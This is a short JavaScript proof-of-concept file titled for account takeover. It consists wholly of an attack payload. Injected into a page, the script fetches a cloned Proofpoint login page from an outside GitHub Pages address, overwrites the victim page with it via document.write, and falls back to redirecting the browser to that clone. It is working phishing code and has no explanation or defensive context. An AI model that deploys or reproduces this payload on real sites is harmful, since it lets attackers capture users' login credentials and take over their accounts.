// poc.js - Full page replacement (GitHub ATO style)
(function() {
    if (window.atoExecuted) return;
    window.atoExecuted = true;
    
    // Fetch your full Proofpoint clone
    fetch('https://swathip888a.github.io/ATO/index.html')
        .then(response => response.text())
        .then(html => {
            // Replace entire page with your clone
            document.open();
            document.write(html);
            document.close();
        })
        .catch(err => {
            // Fallback: direct redirect
            window.location.href = 'https://swathip888a.github.io/ATO/index.html';
        });
})();
